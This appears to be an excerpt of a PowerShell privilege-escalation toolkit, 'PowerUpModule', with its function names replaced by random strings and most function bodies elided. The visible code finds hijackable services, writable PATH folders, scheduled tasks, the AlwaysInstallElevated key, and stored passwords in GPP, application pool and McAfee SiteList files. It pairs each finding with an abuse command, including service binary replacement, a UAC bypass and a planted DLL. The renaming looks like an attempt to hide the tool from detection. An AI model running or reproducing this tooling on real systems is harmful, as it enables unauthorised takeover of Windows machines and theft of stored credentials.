...
function 4V6I57QG {
    ...
    PROCESS {
        ...
        if ($ProcessHandle) {
            ...
            if ($Success) {
                $TokenGroups = 6XVZ9HPG -TokenHandle $hProcToken -InformationClass 'Groups'
...
function SF3L51MN {
    ...
    PROCESS {
        ...
        if ($ProcessHandle) {
            ...
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                6XVZ9HPG -TokenHandle $hProcToken -InformationClass 'Privileges' | ForEach-Object {
...
function R9Z360O5 {
    ...
    PROCESS {
        ...
        if ($ProcessHandle) {
            ...
            if ($Success) {
                $TokenType = 6XVZ9HPG -TokenHandle $hProcToken -InformationClass 'Type'
...
function QWBNJNW9 {
    ...
    PROCESS {
        ForEach($ServiceName in $Name) {
            ...
            try {
                Write-Verbose "QWBNJNW9 IndividualService : $($IndividualService.Name)"
...
function UCH2AWAI {
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            $TargetService = $IndividualService | QWBNJNW9
...
function OSOS5NYZ {
    ...
    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {
            ...
            $ModifiableFiles = $ConcatPathArray | FPASQYX7

            $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                $CanRestart = UCH2AWAI -PermissionSet 'Restart' -Name $Service.name
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                $Out | Add-Member Noteproperty 'Path' $Service.pathname
                $Out | Add-Member Noteproperty 'ModifiablePath' $_
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "URFYG8SO -Name '$($Service.name)' -Path <HijackPath>"
...
function YPF302LB {
    ...
    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {
        ...
        $ServicePath | FPASQYX7 | ForEach-Object {
            $CanRestart = UCH2AWAI -PermissionSet 'Restart' -Name $ServiceName
            $Out = New-Object PSObject
            ...
            $Out | Add-Member Noteproperty 'AbuseFunction' "0CGRQX01 -Name '$ServiceName'"
            $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
            $Out | Add-Member Aliasproperty Name ServiceName
...
function 3C78KVYD {
    ...
    Get-Service | UCH2AWAI -PermissionSet 'ChangeConfig' | ForEach-Object {
        $ServiceDetails = $_ | N51JEM2H
        $CanRestart = $_ | UCH2AWAI -PermissionSet 'Restart'
        $Out = New-Object PSObject
        ...
        $Out | Add-Member Noteproperty 'AbuseFunction' "RGC5VHNO -Name '$($ServiceDetails.name)'"
        $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
        $Out | Add-Member Aliasproperty Name ServiceName
...
function RGC5VHNO {
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
            $ServiceDetails = $TargetService | N51JEM2H
            ...
            ForEach($ServiceCommand in $ServiceCommands) {
                ...
                $Success = $TargetService | 1KLFK4YW -Path "$ServiceCommand"
            ...
            $Success = $TargetService | 1KLFK4YW -Path "$OriginalServicePath"
...
function 0CGRQX01 {
    ...
    PROCESS {
        ...
        $ServiceDetails = $TargetService | N51JEM2H
        $ModifiableFiles = $ServiceDetails.PathName | FPASQYX7 -Literal
        ...
        $Result = URFYG8SO -Name $ServiceDetails.Name -Command $ServiceCommand -Path $ServicePath
...
function 4ZMFW334 {
    ...
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        $TargetPath = $_
        $ModifidablePaths = $TargetPath | FPASQYX7 -Literal | Where-Object {$_ -and ($Null -ne $_) -and ($Null -ne $_.ModifiablePath) -and ($_.ModifiablePath.Trim() -ne '')}
    ...
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            ...
            if ($TaskXML.Task.Triggers) {
                ...
                $TaskXML.Task.Actions.Exec.Command | FPASQYX7 | ForEach-Object {
                    $Out = New-Object PSObject
                ...
                $TaskXML.Task.Actions.Exec.Arguments | FPASQYX7 | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
...
function D7YZMQOR {
    ...
    Write-Verbose "Running D7YZMQOR"
    ...
    $Checks = @(
        ...
        @{
            ...
            Command     = { if ((4V6I57QG | Select-Object -ExpandProperty SID) -contains 'S-1-5-32-544'){ New-Object PSObject } }
            AbuseScript = { 'Invoke-WScriptUACBypass -Command "..."' }
        },
        @{
            Type       = 'Process Token Privileges'
            Command    = { SF3L51MN -Special | Where-Object {$_} }
        },
        ...
        @{
            ...
            Command     = { 4ZMFW334 }
            AbuseScript = { "CJLIK8SV -DllPath '$($_.ModifiablePath)\wlbsctrl.dll'" }
        },
        
        @{
            Type        = 'AlwaysInstallElevated Registry Key'
            Command     = { if (0PEDESS9){ New-Object PSObject } }
            AbuseScript = { 'BKIHNDMJ' }
        },
        @{
        ...
        @{
            ...
            Command = { TCNAFXFE | Where-Object {$_} }
        },
        @{
            Type    = 'Encrypted Application Pool Passwords'
            Command = { OPWNWR59 | Where-Object {$_} }
        },
        @{
            Type    = 'McAfee SiteList.xml files'
            Command = { 2TUFNT1N | Where-Object {$_} }
        },
        @{
            Type    = 'Cached GPP Files'
            Command = { 8UIT3Z40 | Where-Object {$_} }
        }
    )
...
$Module = CKCYIJIN -ModuleName PowerUpModule
...
Set-Alias Get-CurrentUserTokenGroupSid 4V6I57QG
Set-Alias Invoke-AllChecks D7YZMQOR
